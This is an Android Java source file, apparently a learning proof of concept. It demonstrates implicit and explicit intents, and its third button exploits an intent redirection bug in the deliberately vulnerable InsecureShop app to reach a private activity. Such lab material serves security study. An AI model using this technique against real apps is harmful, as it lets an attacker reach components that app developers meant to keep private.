package io.gi0cann.javapoc;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // implicit intent
        Button implicitBtn = (Button) findViewById(R.id.btn_implicit_intent);
        implicitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://www.google.com"));
                startActivity(intent);
            }
        });

        // explicit intent
        Button explicitBtn = (Button) findViewById(R.id.btn_explicit_intent);
        explicitBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_VIEW);
                intent.setData(Uri.parse("https://www.bing.com"));
                intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.IntentDispatcher");
                startActivity(intent);
            }
        });

        // exploit intent redirection bug in com.insecureshop.WebView2Activity activity
        Button intentRedirectionBtn = (Button) findViewById(R.id.btn_intent_redirection);
        intentRedirectionBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent privateIntent = new Intent();
                privateIntent.setComponent(new ComponentName("com.insecureshop", "com.insecureshop.PrivateActivity"));
                privateIntent.putExtra("url", "https://www.google.com");

                Intent redirIntent = new Intent();
                redirIntent.setComponent(new ComponentName("com.insecureshop", "com.insecureshop.WebView2Activity"));
                redirIntent.putExtra("extra_intent", privateIntent);
                startActivity(redirIntent);
            }
        });

    }
}